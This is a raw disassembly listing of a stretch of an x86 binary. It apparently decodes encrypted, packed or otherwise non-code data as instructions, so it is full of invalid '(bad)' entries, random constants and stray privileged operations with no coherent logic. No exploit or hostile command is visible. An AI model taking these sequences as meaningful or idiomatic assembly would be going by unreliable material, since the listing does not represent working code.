  417b24:	xor    DWORD PTR [ecx],ecx
  417b26:	xor    bh,BYTE PTR [ebp+0x3a1fd6a7]
  417b2c:	imul   ebp,DWORD PTR [edi+ecx*1],0x45c13aa7
  417b33:	mov    al,0x96
  417b35:	xchg   ecx,eax
  417b36:	mov    ecx,0x352904c6
  417b3b:	mov    al,ds:0x3614207f
  417b40:	sub    ebx,esp
  417b42:	push   eax
  417b43:	ins    BYTE PTR es:[edi],dx
  417b44:	pop    es
  417b45:	mov    ah,0xfc
  417b47:	fstp   TBYTE PTR [ebx-0x49902615]
  417b4d:	fwait
  417b4e:	mov    eax,ds:0xe3e6f61d
  417b53:	mov    ah,0xd
  417b55:	jbe    0x417b4b
  417b57:	xchg   edi,eax
  417b58:	in     eax,dx
  417b59:	or     dh,0xbb
  417b5c:	and    al,0xc0
  417b5e:	imul   eax,DWORD PTR [ecx+0x40],0x94d94806
  417b65:	pop    ecx
  417b66:	lock xchg ebp,eax
  417b68:	sbb    al,0xac
  417b6a:	sbb    DWORD PTR [edx],esp
  417b6c:	fstp   QWORD PTR [edx]
  417b6e:	cmp    ecx,DWORD PTR [ecx+0x1d5f604e]
  417b74:	arpl   WORD PTR [eax+ecx*1+0x2202b6d7],bp
  417b7b:	sbb    edx,DWORD PTR [edi]
  417b7d:	mov    edx,0x31b68fb2
  417b82:	(bad)  [ebp-0x40]
  417b85:	mov    ds:0xcf5d0674,al
  417b8a:	pop    ecx
  417b8b:	lahf   
  417b8c:	repnz retf 
  417b8e:	push   eax
  417b8f:	add    al,0x64
  417b91:	es stos DWORD PTR es:[edi],eax
  417b93:	mov    WORD PTR [esi-0x6e14786d],?
  417b99:	or     al,0x52
  417b9b:	cwde   
  417b9c:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417b9e:	scas   al,BYTE PTR es:[edi]
  417b9f:	mov    gs,esi
  417ba1:	mov    eax,0xac8109
  417ba6:	mov    dl,0x49
  417ba8:	jno    0x417baa
  417baa:	xchg   BYTE PTR [edx+0x40bdd7ed],bl
  417bb0:	cmc    
  417bb1:	rol    edi,1
  417bb3:	add    cl,ah
  417bb5:	push   ds
  417bb6:	loop   0x417b73
  417bb8:	mov    ?,WORD PTR [edx-0x6d1ff8c2]
  417bbe:	pop    edi
  417bbf:	inc    ecx
  417bc0:	push   cs
  417bc1:	ins    BYTE PTR es:[edi],dx
  417bc2:	sub    ebp,DWORD PTR [ecx+edx*8+0x6f]
  417bc6:	hlt    
  417bc7:	sub    BYTE PTR [ebx+0x36],dh
  417bca:	ret    0xecc3
  417bcd:	dec    edi
  417bce:	sar    DWORD PTR [ebx+0x57],1
  417bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bd2:	push   eax
  417bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bd4:	jno    0x417b6f
  417bd6:	retf   
  417bd7:	cmp    DWORD PTR [esi+0x1bfa84bc],edx
  417bdd:	inc    edi
  417bde:	xor    al,0x7e
  417be0:	out    dx,eax
  417be1:	push   es
  417be2:	into   
  417be3:	xchg   esp,eax
  417be4:	(bad)  
  417be5:	jmp    0xca9fd073
  417bea:	sub    BYTE PTR [edi-0x76f13131],bh
  417bf0:	pop    ss
  417bf1:	stos   DWORD PTR es:[edi],eax
  417bf2:	mov    esi,0x6cc6bb28
  417bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bf8:	retf   0xd2fb
  417bfb:	jb     0x417c27
  417bfd:	xchg   edi,eax
  417bfe:	xlat   BYTE PTR ds:[ebx]
  417bff:	out    0xaf,eax
  417c01:	sar    BYTE PTR [edx+0x41],0xda
  417c05:	jb     0x417c08
  417c07:	sbb    eax,0x4d678bff
  417c0c:	jb     0x417beb
  417c0e:	cmp    BYTE PTR [esi-0x72],dh
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x16
  417c81:	daa    
  417c82:	adc    ebp,DWORD PTR [edi-0x57]
  417c85:	sti    
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    eax,0xbe000001
  417c8d:	push   ds
  417c8e:	sbb    al,0x72
  417c90:	out    0x6b,al
  417c92:	cmp    eax,DWORD PTR [ebx-0x5c7dceba]
  417c98:	or     dl,cl
  417c9a:	jl     0x417c7d
  417c9c:	not    dl
  417c9e:	jmp    0x417c88
  417ca0:	std    
  417ca1:	ret    0x1240
  417ca4:	sbb    al,0xf2
  417ca6:	pcmpeqw mm1,QWORD PTR [esi+0x7cddbc07]
  417cad:	push   edi
  417cae:	push   0xffffffc2
  417cb0:	xor    ebx,DWORD PTR [esi+0x5c]
  417cb3:	jge    0x417cbb
  417cb5:	clc    
  417cb6:	test   al,0x97
  417cb8:	jmp    0x417d0d
  417cba:	in     eax,0x2
  417cbc:	cmp    al,0xf9
  417cbe:	jo     0x417c6f
  417cc0:	aad    0x56
  417cc2:	nop    DWORD PTR [ebp+0x7fb95353]
  417cc9:	pop    eax
  417cca:	mov    BYTE PTR [edx-0x7b],al
  417ccd:	add    al,0xe5
  417ccf:	xor    ecx,DWORD PTR [edi+0x12]
  417cd2:	hlt    
  417cd3:	hlt    
  417cd4:	sbb    al,0xfb
  417cd6:	daa    
  417cd7:	jae    0x417cb6
  417cd9:	retf   
  417cda:	jmp    0xfac33847
  417cdf:	rcr    DWORD PTR [eiz*8-0x24479b2b],cl
  417ce6:	les    edx,FWORD PTR [eax+0x6c775525]
  417cec:	push   ebp
  417ced:	push   ecx
  417cee:	and    BYTE PTR [ebx],bh
  417cf0:	pop    eax
  417cf1:	cwde   
  417cf2:	mov    ch,0x71
  417cf4:	mov    esp,0x1c2c6f7c
  417cf9:	mov    bh,0x4f
  417cfb:	push   cs
  417cfc:	sub    al,0x5d
  417cfe:	dec    ebx
  417cff:	dec    edi
  417d00:	mov    ebp,ebp
  417d02:	add    DWORD PTR [ebx],eax
  417d04:	push   cs
  417d05:	pop    es
  417d06:	call   0x2b9d7f16
  417d0b:	nop
  417d0c:	or     DWORD PTR [esi+0x619c53ed],esi
  417d12:	xchg   edi,eax
  417d13:	mov    DWORD PTR [eax+0xf2c6bd8],edi
  417d19:	adc    DWORD PTR [esi],0x1087f9d8
  417d1f:	rcr    bh,1
  417d21:	mov    esp,0x432cc744
  417d26:	jp     0x417d66
  417d28:	xchg   BYTE PTR [eax+0x5ff6f066],bh
  417d2e:	scas   al,BYTE PTR es:[edi]
  417d2f:	adc    BYTE PTR ds:0xda4a185c,al
  417d35:	mov    ebp,0xbcd4417a
  417d3a:	bound  ebx,QWORD PTR [esi]
  417d3c:	adc    dh,BYTE PTR [esi]
  417d3e:	lods   eax,DWORD PTR ds:[esi]
  417d3f:	mov    gs,WORD PTR [esi+ecx*1]
  417d42:	cld    
  417d43:	adc    eax,0x4833c2fd
  417d48:	fidivr WORD PTR [ebx-0x42e342b5]
  417d4e:	inc    ecx
  417d4f:	adc    al,0x73
  417d51:	(bad)  
  417d52:	pop    ebp
  417d53:	dec    ebx
  417d54:	lahf   
  417d55:	(bad)  
  417d56:	into   
  417d57:	inc    eax
  417d58:	adc    ch,BYTE PTR [eax+0x52]
  417d5b:	mov    esp,0x7dc6ed7e
  417d60:	ins    DWORD PTR es:[edi],dx
  417d61:	pop    ds
  417d62:	push   ds
  417d63:	in     eax,0x7f
  417d65:	xchg   edx,eax
  417d66:	dec    esp
  417d67:	xchg   esp,eax
  417d68:	mov    DWORD PTR ds:[esi-0x2cc14176],eax
  417d6f:	cdq    
  417d70:	je     0x417d28
  417d72:	fsubr  QWORD PTR es:[edx+0x1d]
  417d76:	sbb    dh,BYTE PTR [edx]
  417d78:	(bad)  [ecx+0x45]
  417d7b:	mov    dh,BYTE PTR [ebp-0x26851baf]
  417d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d83:	xor    eax,0xe7bc67b3
  417d88:	pop    esi
  417d89:	sub    BYTE PTR [edi+0x22],bl
  417d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d8d:	sub    ebp,DWORD PTR [edi-0xf]
  417d90:	adc    BYTE PTR [eax],al
	...
  417df2:	add    BYTE PTR [eax],al
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	out    0x45,eax
  417e02:	shl    BYTE PTR [ebp-0x52],0xfc
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x5c000001
  417e0d:	int3   
  417e0e:	mov    edi,0x777c9ca8
  417e13:	xor    al,0xc7
  417e15:	daa    
  417e16:	mov    al,0x65
  417e18:	clc    
  417e19:	push   es
  417e1a:	enter  0xb5ca,0xad
  417e1e:	mov    bl,0xe8
  417e20:	lods   eax,DWORD PTR ds:[esi]
  417e21:	push   ds
  417e22:	sub    DWORD PTR [ebx+0x59],0xffffffc4
  417e26:	imul   ebp,DWORD PTR [ebx+0x43],0x77c7a3c0
  417e2d:	push   esp
  417e2e:	(bad)  
  417e2f:	fstp   DWORD PTR [edx]
  417e31:	xchg   edx,eax
  417e32:	cs std 
  417e34:	fcmove st,st(2)
  417e36:	jne    0x417e06
  417e38:	in     al,dx
  417e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e3a:	add    DWORD PTR [eax],ecx
  417e3c:	into   
  417e3d:	aaa    
  417e3e:	repz cmp BYTE PTR [esi+eiz*2-0x79],cl
  417e43:	fisubr DWORD PTR [ebx+eax*1+0x7a137301]
  417e4a:	push   esp
  417e4b:	(bad)  
  417e4c:	inc    esp
  417e4d:	popa   
  417e4e:	js     0x417e6b
  417e50:	mov    dh,0x7f
  417e52:	fisttp DWORD PTR [edi]
  417e54:	lea    edx,[esp+ebp*4+0x52]
  417e58:	push   0x20
  417e5a:	dec    edx
  417e5b:	in     al,0xd
  417e5d:	(bad)  
  417e5f:	inc    edi
  417e60:	push   esp
  417e61:	fwait
  417e62:	pop    edx
  417e63:	test   al,0xe9
  417e65:	div    dh
  417e67:	and    al,0xdc
  417e69:	cwde   
  417e6a:	je     0x417e97
  417e6c:	jne    0x417ebb
  417e6e:	ds jge 0x417e6f
  417e71:	xor    BYTE PTR [ebx+0xc],0xe0
  417e75:	in     eax,0x24
  417e77:	daa    
  417e78:	sbb    DWORD PTR [eax-0x357ae155],0x7f
  417e7f:	mov    bh,0x56
  417e81:	adc    eax,DWORD PTR [edi+esi*8+0x57]
  417e85:	cdq    
  417e86:	cmp    BYTE PTR [edi],0xa7
  417e89:	out    dx,eax
  417e8a:	call   0x847e:0xe6cff512
  417e91:	or     BYTE PTR [edx+ebx*2],0x7d
  417e95:	into   
  417e96:	cs dec ebx
  417e98:	mov    esi,0xb5791ba1
  417e9d:	add    DWORD PTR [edi-0x2030cd5a],ebx
  417ea3:	hlt    
  417ea4:	bound  esp,QWORD PTR [esi-0x28]
  417ea7:	aaa    
  417ea8:	xor    al,0x7a
  417eaa:	push   eax
  417eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eac:	popf   
  417ead:	mov    BYTE PTR [eax+ecx*4+0x5f2d8e0f],dl
  417eb4:	inc    ebx
  417eb5:	sbb    eax,0x5e8bb0fa
  417eba:	mov    cl,0x2a
  417ebc:	test   eax,0x4b6ff68f
  417ec1:	nop
  417ec2:	outs   dx,DWORD PTR ds:[esi]
  417ec3:	xchg   edi,eax
  417ec4:	sub    eax,0xd3c21f69
  417ec9:	and    al,BYTE PTR [edx]
  417ecb:	fld    QWORD PTR [edi+0x18]
  417ece:	inc    ebp
  417ecf:	xchg   ecx,eax
  417ed0:	jae    0x417ea8
  417ed2:	retf   
  417ed3:	in     al,0x2a
  417ed5:	pop    ds
  417ed6:	dec    ebx
  417ed7:	retf   
  417ed8:	mov    dl,BYTE PTR [ebx+0x7f]
  417edb:	loop   0x417f15
  417edd:	mov    al,0xb
  417edf:	(bad)
  417ee3:	inc    ebx
  417ee4:	jns    0x417f46
  417ee6:	imul   edx,DWORD PTR ds:0xb0bae351,0xffffff88
  417eed:	(bad)  
  417eee:	(bad)  
  417ef0:	pop    ebp
  417ef1:	fmul   QWORD PTR [ecx]
  417ef3:	sbb    eax,DWORD PTR [edi]
  417ef5:	sub    BYTE PTR [ebp-0x68d33e84],dh
  417efb:	pushf  
  417efc:	sub    DWORD PTR [edx],ebx
  417efe:	mov    DWORD PTR ds:0x4cf7bb64,ebx
  417f04:	sbb    al,0x40
  417f06:	add    dh,BYTE PTR [ebp+0x7d]
  417f09:	xlat   BYTE PTR ds:[ebx]
  417f0a:	cmp    dh,bl
  417f0c:	ss inc eax
  417f0e:	jp     0x417eb4
  417f10:	imul   eax,DWORD PTR [eax],0x0
	...
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	sti    
  417f81:	adc    eax,0xfdb3036d
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x15000001
  417f8d:	jo     0x417f5a
  417f8f:	retf   0x4768
  417f92:	mov    dh,0x43
  417f94:	rcr    DWORD PTR [esi-0x64e5677e],cl
  417f9a:	fadd   DWORD PTR [ebx+ecx*4+0x7e]
  417f9e:	scas   eax,DWORD PTR es:[edi]
  417f9f:	sub    al,0xa1
  417fa1:	mov    al,cl
  417fa3:	mov    dl,BYTE PTR [esi]
  417fa5:	xor    DWORD PTR [ebx+0x68],0xffffffbc
  417fa9:	(bad)  
  417faa:	in     eax,dx
  417fab:	enter  0x8ea0,0x84
  417faf:	add    BYTE PTR [ebp+0x25],bl
  417fb2:	dec    edx
  417fb3:	pop    ss
  417fb4:	adc    al,0x68
  417fb6:	dec    edx
  417fb7:	mov    eax,gs
  417fb9:	dec    edi
  417fba:	rcr    DWORD PTR [ecx],cl
  417fbc:	sbb    cl,ah
  417fbe:	sbb    bh,BYTE PTR [edi+0x28d94436]
  417fc4:	mov    ds:0xf171592a,al
  417fc9:	(bad)  
  417fca:	cs or  DWORD PTR es:[ebp+edx*4+0x43],0xffffffe0
  417fd1:	xor    al,0xce
  417fd3:	idiv   DWORD PTR [edi+eiz*1-0x7b]
  417fd7:	push   ebx
  417fd8:	xlat   BYTE PTR ds:[ebx]
  417fd9:	adc    BYTE PTR [ebx+0x59],bl
  417fdc:	mov    ds:0xfe9a4a87,al
  417fe1:	dec    esi
  417fe2:	sub    eax,0x13f747b6
  417fe7:	and    eax,0x6d762783
  417fec:	std    
  417fed:	sub    eax,0x4f1cc6e7
  417ff2:	mov    al,0x63
  417ff4:	xchg   BYTE PTR [esi+0x9],ah
  417ff7:	nop
  417ff8:	inc    edx
  417ff9:	xor    dl,ah
  417ffb:	inc    ebp
  417ffc:	ret    
  417ffd:	aad    0xc7
  417fff:	aad    0xe7
  418001:	mov    cl,BYTE PTR [edx]
  418003:	into   
  418004:	mov    eax,ds:0x22a35a3c
  418009:	inc    esi
  41800a:	daa    
  41800b:	push   ebp
  41800c:	or     eax,0x41293b53
  418011:	sbb    BYTE PTR [ebp+0x23afa2b],dl
  418017:	and    dh,BYTE PTR [eax-0x5c9e7916]
  41801d:	mov    al,BYTE PTR [ecx+0x609e5670]
  418023:	mov    ds:0xfa01bdd5,al
  418028:	stc    
  418029:	mov    ebp,0xb39a4e65
  41802e:	fsub   st(2),st
  418030:	push   ss
  418031:	pop    ecx
  418032:	out    dx,al
  418033:	push   edi
  418034:	mov    esp,0x5bcf8db6
  418039:	jle    0x418004
  41803b:	sbb    al,0x41
  41803d:	scas   eax,DWORD PTR es:[edi]
  41803e:	push   cs
  41803f:	call   0xab6d:0x24ed9fd
  418046:	and    BYTE PTR [ebx-0x55e19c4],dh
  41804c:	test   DWORD PTR [ebp-0x6f],edi
  41804f:	cld    
  418050:	mov    ch,0x49
  418052:	iret   
  418053:	loop   0x41808c
  418055:	jno    0x41802f
  418057:	jne    0x41801f
  418059:	jmp    0x1600:0xa6b2f748
  418060:	mov    dl,0x8c
  418062:	and    al,0xbc
  418064:	fsubr  st(7),st
  418066:	xor    ah,BYTE PTR [eax-0x6a16e0cc]
  41806c:	xor    al,0x36
  41806e:	mov    BYTE PTR [ecx+0x29],dh
  418071:	ss mov cs,ecx
  418074:	retf   
  418075:	loop   0x418083
  418077:	ror    esp,0x29
  41807a:	cmp    bh,BYTE PTR [ebx+0x5629c5a3]
  418080:	lods   eax,DWORD PTR ds:[esi]
  418081:	and    ecx,edi
  418083:	pushf  
  418084:	mov    esp,0x8cd95e1f
  418089:	cwde   
  41808a:	jb     0x418099
  41808c:	sub    esp,DWORD PTR [ecx+0xdfd62e]
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x6b2fdebc,eax
  418101:	jecxz  0x4180a6
  418103:	inc    esp
  418104:	mov    eax,0x50000fe
  418109:	add    DWORD PTR [eax],eax
  41810b:	add    BYTE PTR [ebx+0x7b8fe988],cl
  418111:	cmp    bh,BYTE PTR [edx]
  418113:	in     al,dx
  418114:	mov    ebp,0x29fe1f5d
  418119:	push   edx
  41811a:	and    ecx,DWORD PTR [ecx-0x5e3ed4ca]
  418120:	xchg   edx,eax
  418121:	sub    al,0x4c
  418123:	shr    bl,1
  418125:	sub    ah,BYTE PTR [esi+0x44b14e4c]
  41812b:	ret    0xe5c3
  41812e:	pop    esi
  41812f:	mov    ecx,0x1302f830
  418134:	and    ebx,DWORD PTR [ebx+0x66]
  418137:	mov    al,0x69
  418139:	xchg   ebx,eax
  41813a:	mov    edx,ebp
  41813c:	push   edi
  41813d:	bound  esp,QWORD PTR [eax]
  41813f:	fild   DWORD PTR [edi-0x36]
  418142:	adc    DWORD PTR [eax],ebp
  418144:	adc    DWORD PTR [edi-0x33],edi
  418147:	mov    eax,0xf98650b5
  41814c:	data16 sub dl,BYTE PTR [esi]
  41814f:	call   0xba33:0xf8dbeffc
  418156:	int3   
  418157:	add    eax,0xe931abfb
  41815c:	les    esi,FWORD PTR [esi+0x11]
  41815f:	xor    edi,ecx
  418161:	lds    edi,FWORD PTR [ebx+0x22c9a25]
  418167:	sub    ebp,DWORD PTR ds:0xa97d1269
  41816d:	out    0x31,al
  41816f:	scas   eax,DWORD PTR es:[edi]
  418170:	adc    DWORD PTR [ecx],eax
  418172:	add    bh,dh
  418174:	sbb    esi,DWORD PTR [edi]
  418176:	or     al,0xb
  418178:	(bad)  [ebx+0x21]
  41817b:	lock (bad) 
  41817d:	lea    edi,gs:0xa2a9a389
  418184:	pop    esp
  418185:	mov    dh,0x4f
  418187:	add    edi,ebp
  418189:	mov    ds:0x5bd0f65e,eax
  41818e:	enter  0xd998,0x63
  418192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418193:	adc    BYTE PTR [edi-0xd],al
  418196:	adc    BYTE PTR [edi+0x862f77c],bl
  41819c:	sbb    al,0x21
  41819e:	fadd   DWORD PTR [ebp+edx*8+0x6e]
  4181a2:	and    ah,dh
  4181a4:	sub    ch,cl
  4181a6:	hlt    
  4181a7:	loop   0x418186
  4181a9:	xor    eax,0x4e1164de
  4181ae:	sub    DWORD PTR [edx],esi
  4181b0:	jg     0x418231
  4181b2:	fcomp  QWORD PTR [ebp+0x776e2616]
  4181b8:	(bad)  
  4181b9:	retf   0x6fa0
  4181bc:	push   ebp
  4181bd:	stc    
  4181be:	imul   ebx,edx,0xffffffcb
  4181c1:	adc    edi,eax
  4181c3:	jns    0x4181e1
  4181c5:	out    dx,al
  4181c6:	in     al,0x2b
  4181c8:	out    dx,al
  4181c9:	or     al,0x16
  4181cb:	xchg   ecx,eax
  4181cc:	cmp    ebp,DWORD PTR [ecx+0x2070c15e]
  4181d2:	jl     0x4181a3
  4181d4:	in     eax,dx
  4181d5:	adc    DWORD PTR [ebx-0x5c36c6ac],esp
  4181db:	adc    al,0x1f
  4181dd:	pop    edi
  4181de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181df:	push   es
  4181e0:	fucomip st,st(5)
  4181e2:	and    esi,edx
  4181e4:	or     BYTE PTR [esi],0x53
  4181e7:	pop    eax
  4181e8:	mov    ds:0x32909d25,al
  4181ed:	mov    DWORD PTR [edx],ecx
  4181ef:	or     BYTE PTR [eax+ecx*1+0x3242ede6],ch
  4181f6:	adc    eax,ebx
  4181f8:	mov    gs,eax
  4181fa:	(bad)  
  4181fb:	mov    esi,DWORD PTR [ecx]
  4181fd:	mov    dh,0xb
  4181ff:	xor    al,0xbd
  418201:	ins    DWORD PTR es:[edi],dx
  418202:	add    al,cl
  418204:	jmp    0x4181a5
  418206:	leave  
  418207:	bnd jns 0x4181d9
  41820a:	das    
  41820b:	jns    0x4181d5
  41820d:	arpl   WORD PTR [edi-0x19],cx
  418210:	test   DWORD PTR [eax],0x0
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x8559b8d6
  418282:	pop    ebx
  418283:	dec    ecx
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    dh,bh
  41828d:	pop    edi
  41828e:	out    0xab,eax
  418290:	cs push 0x617a8140
  418296:	xor    ch,ah
  418298:	lock out 0xeb,al
  41829b:	jo     0x418310
  41829d:	adc    al,0xba
  41829f:	call   0x5fdaf268
  4182a4:	pop    esi
  4182a5:	or     eax,DWORD PTR [edi-0x62]
  4182a8:	retf   0xbe58
  4182ab:	stos   DWORD PTR es:[edi],eax
  4182ac:	lds    edx,FWORD PTR [eax+0x274a9e36]
  4182b2:	sub    eax,0x85a093ca
  4182b7:	(bad)
  4182ba:	in     eax,dx
  4182bb:	aas    
  4182bc:	mov    fs,WORD PTR [eax]
  4182be:	mov    bl,0x88
  4182c0:	outs   dx,DWORD PTR ds:[esi]
  4182c1:	sub    eax,0x4032bb7b
  4182c6:	mov    dl,0x86
  4182c8:	sbb    ch,BYTE PTR [eiz*8+0x87f6677]
  4182cf:	aam    0x59
  4182d1:	or     BYTE PTR [edx+eiz*2+0x57b2b409],al
  4182d8:	lods   al,BYTE PTR ds:[esi]
  4182d9:	dec    esi
  4182da:	cmp    cl,0xaf
  4182dd:	enter  0xe135,0xd5
  4182e1:	dec    ecx
  4182e2:	(bad)  
  4182e3:	mov    dh,0x10
  4182e5:	loope  0x41829f
  4182e7:	ss loope 0x41835d
  4182ea:	ja     0x418296
  4182ec:	mov    dh,0x18
  4182ee:	out    0xf5,al
  4182f0:	pop    esi
  4182f1:	mov    dh,0xf8
  4182f3:	dec    ecx
  4182f4:	dec    ebx
  4182f5:	pushf  
  4182f6:	es not ebp
  4182f9:	imul   ebx,DWORD PTR [ecx+0x19],0xffffffcf
  4182fd:	mov    ds:0x9592ea6a,al
  418302:	add    BYTE PTR [esi-0x26],0x3b
  418306:	dec    esp
  418307:	sub    eax,0xc685d6dc
  41830c:	ins    DWORD PTR es:[edi],dx
  41830d:	das    
  41830e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41830f:	sbb    bh,BYTE PTR [edi]
  418311:	or     bl,al
  418313:	cmc    
  418314:	push   edi
  418315:	cmp    BYTE PTR [esi+0x15db7e1],bh
  41831b:	fs ds xor al,0xd5
  41831f:	xchg   ebx,eax
  418320:	xchg   edx,eax
  418321:	in     eax,0x1c
  418323:	sar    DWORD PTR [ebp-0x1e56ca61],0xb5
  41832a:	or     al,0x7c
  41832c:	adc    ebp,ebp
  41832e:	add    DWORD PTR [ecx+eax*8+0x27],ecx
  418332:	xor    ebp,DWORD PTR [ecx+0x1c785fdc]
  418338:	xor    ebx,ebx
  41833a:	iret   
  41833b:	outs   dx,BYTE PTR ds:[esi]
  41833c:	cmp    bl,BYTE PTR [esi+esi*2-0x1b]
  418340:	lods   al,BYTE PTR ds:[esi]
  418341:	and    DWORD PTR [ebx+0x63dddeb9],ebx
  418347:	add    DWORD PTR fs:[eax+0x17a66211],0x70
  41834f:	shl    BYTE PTR [esi+0xa],1
  418352:	mov    ah,0xa6
  418354:	fs sbb ah,ch
  418357:	imul   ebx,DWORD PTR [edi],0xae65e348
  41835d:	jns    0x41838e
  41835f:	inc    edx
  418360:	xchg   esi,eax
  418361:	mov    esp,0x532477d
  418366:	fwait
  418367:	xchg   esp,eax
  418368:	pop    edx
  418369:	or     ah,BYTE PTR [eax+0x15]
  41836c:	repnz push cs
  41836e:	mov    esp,0x8d882638
  418373:	sub    esi,DWORD PTR [ecx+0x4280efee]
  418379:	ins    DWORD PTR es:[edi],dx
  41837a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41837b:	mov    al,ds:0x5e9bfcc8
  418380:	jl     0x4183b2
  418382:	lds    eax,FWORD PTR [esi+0x334bb9a7]
  418388:	mul    ah
  41838a:	jne    0x4183be
  41838c:	push   edi
  41838d:	into   
  41838e:	push   0x9041
	...
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	push   esi
  418401:	inc    ebx
  418402:	add    BYTE PTR [edi+0x100c2],dh
  418408:	add    eax,0x27000001
  41840d:	mov    bl,BYTE PTR [edi+0x10]
  418410:	aaa    
  418411:	push   ebp
  418412:	bound  esp,QWORD PTR [ecx]
  418414:	and    eax,0x493f21d4
  418419:	push   0x9e3ba51d
  41841e:	mov    bl,0xf0
  418420:	adc    BYTE PTR ds:0x4a2a73c0,cl
  418426:	and    al,0x28
  418428:	shr    BYTE PTR [ebx],1
  41842a:	and    bl,BYTE PTR ds:0xae38e24a
  418430:	adc    eax,0x5769c62c
  418435:	add    eax,0x9eec8769
  41843a:	popa   
  41843b:	push   ds
  41843c:	imul   BYTE PTR fs:[edx]
  41843f:	add    dh,BYTE PTR [ebx-0x44]
  418442:	mov    ebx,0x811bf0d8
  418447:	loope  0x41841f
  418449:	cdq    
  41844a:	sti    
  41844b:	push   esi
  41844c:	add    eax,0xe613dd50
  418451:	xlat   BYTE PTR ds:[ebx]
  418452:	xlat   BYTE PTR ds:[ebx]
  418453:	sbb    BYTE PTR [edx+0x46600cf4],bl
  418459:	iret   
  41845a:	sbb    eax,DWORD PTR [ebx+0x6c54a056]
  418460:	mov    ebx,0xed0e8823
  418465:	and    ah,BYTE PTR [edx-0x561786cc]
  41846b:	push   0xffffffeb
  41846d:	stc    
  41846e:	ins    BYTE PTR es:[edi],dx
  41846f:	ss add al,0x77
  418472:	jmp    0x418409
  418474:	mov    dl,0x6a
  418476:	xor    edx,DWORD PTR [ebp-0x77]
  418479:	aad    0xea
  41847b:	jmp    0x4184c6
  41847d:	mov    ebx,0xcb569636
  418482:	mov    WORD PTR [eax+0x123a85f9],?
  418488:	rcl    DWORD PTR [esi-0x46208be5],cl
  41848e:	add    al,0xda
  418490:	(bad)  
  418491:	shr    BYTE PTR [ecx+0x3d],1
  418494:	adc    BYTE PTR [edi],0x6f
  418497:	adc    dl,ah
  418499:	xchg   edi,eax
  41849a:	repz or al,0x61
  41849d:	and    esp,DWORD PTR [edx]
  41849f:	push   esp
  4184a0:	and    DWORD PTR [esi+0x55],ebx
  4184a3:	retf   
  4184a4:	pop    esp
  4184a5:	push   esi
  4184a6:	mov    al,ds:0xaf7b6ac1
  4184ab:	fwait
  4184ac:	das    
  4184ad:	adc    BYTE PTR [ebp+0x5116c14a],0xa4
  4184b4:	fst    DWORD PTR [esi+0x3b]
  4184b7:	add    eax,0xe3f58e62
  4184bc:	call   0x7097:0x468cbca8
  4184c3:	or     DWORD PTR [eax-0x66ad2b18],ebp
  4184c9:	and    BYTE PTR [edi+0x63],bl
  4184cc:	sub    dh,ch
  4184ce:	cs neg esp
  4184d1:	or     BYTE PTR [edi],dl
  4184d3:	jl     0x4184c5
  4184d5:	gs mov bl,0xe9
  4184d8:	mov    dh,0xf0
  4184da:	lock in al,0x86
  4184dd:	shl    DWORD PTR [esi-0x17],cl
  4184e0:	idiv   edi
  4184e2:	fisub  DWORD PTR [esi-0x2b]
  4184e5:	xchg   ecx,ecx
  4184e7:	and    ebp,DWORD PTR ds:0xccebb6fe
  4184ed:	mov    DWORD PTR [ecx],ebp
  4184ef:	inc    ecx
  4184f0:	push   ss
  4184f1:	mov    eax,ds:0x43058123
  4184f6:	add    al,0xa8
  4184f8:	popa   
  4184f9:	cli    
  4184fa:	mov    ds:0x7bb7bee3,eax
  4184ff:	popa   
  418500:	dec    edx
  418501:	adc    bh,0x84
  418504:	or     eax,0x842503f1
  418509:	xchg   esi,eax
  41850a:	adc    cl,BYTE PTR [eax+0x194dca95]
  418510:	mov    BYTE PTR [eax],al
	...
  418572:	add    BYTE PTR [eax],al
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	dec    ecx
  418581:	mov    eax,0x1c7c6a7
  418586:	add    DWORD PTR [eax],eax
  418588:	add    eax,0xa0000001
  41858d:	mov    eax,ds:0x1faba209
  418592:	in     eax,dx
  418593:	repnz sti 
  418595:	aas    
  418596:	(bad)  
